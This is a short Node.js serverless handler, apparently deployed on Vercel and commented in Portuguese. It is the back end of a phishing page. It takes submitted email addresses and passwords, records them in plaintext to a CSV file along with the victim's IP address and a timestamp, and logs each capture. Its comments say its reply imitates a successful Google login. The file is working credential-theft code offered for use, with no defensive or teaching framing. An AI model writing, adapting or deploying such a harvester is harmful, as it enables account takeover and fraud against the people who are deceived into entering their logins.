const fs = require('fs');
const path = require('path');
const createCsvWriter = require('csv-writer').createObjectCsvWriter;

// Caminho do arquivo CSV (usar /tmp na Vercel)
const CSV_FILE = path.join('/tmp', 'credentials.csv');

// Função para inicializar CSV se não existir
async function initCSV() {
    if (!fs.existsSync(CSV_FILE)) {
        const csvWriter = createCsvWriter({
            path: CSV_FILE,
            header: [
                { id: 'timestamp', title: 'Timestamp' },
                { id: 'email', title: 'Email' },
                { id: 'password', title: 'Password' },
                { id: 'ip', title: 'IP Address' }
            ],
            append: false
        });
        await csvWriter.writeRecords([]);
        console.log('Arquivo CSV criado com sucesso');
    }
}

module.exports = async (req, res) => {
    // Configurar CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Lidar com preflight
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // Apenas aceitar POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        // Inicializar CSV se necessário
        await initCSV();

        const { email, password } = req.body;
        const timestamp = new Date().toISOString();
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || 
                   req.headers['x-real-ip'] || 
                   req.connection?.remoteAddress || 
                   'Unknown';

        if (!email || !password) {
            return res.status(400).json({ error: 'Email e senha são obrigatórios' });
        }

        // Criar writer com append
        const csvWriter = createCsvWriter({
            path: CSV_FILE,
            header: [
                { id: 'timestamp', title: 'Timestamp' },
                { id: 'email', title: 'Email' },
                { id: 'password', title: 'Password' },
                { id: 'ip', title: 'IP Address' }
            ],
            append: true
        });

        // Salvar no CSV
        await csvWriter.writeRecords([{
            timestamp: timestamp,
            email: email,
            password: password,
            ip: ip
        }]);

        console.log(`Credenciais salvas: ${email} - ${new Date().toLocaleString()}`);

        // Retornar sucesso (simular resposta do Google)
        res.json({ 
            success: true,
            message: 'Login realizado com sucesso'
        });

    } catch (error) {
        console.error('Erro ao salvar credenciais:', error);
        res.status(500).json({ error: 'Erro ao processar requisição' });
    }
};
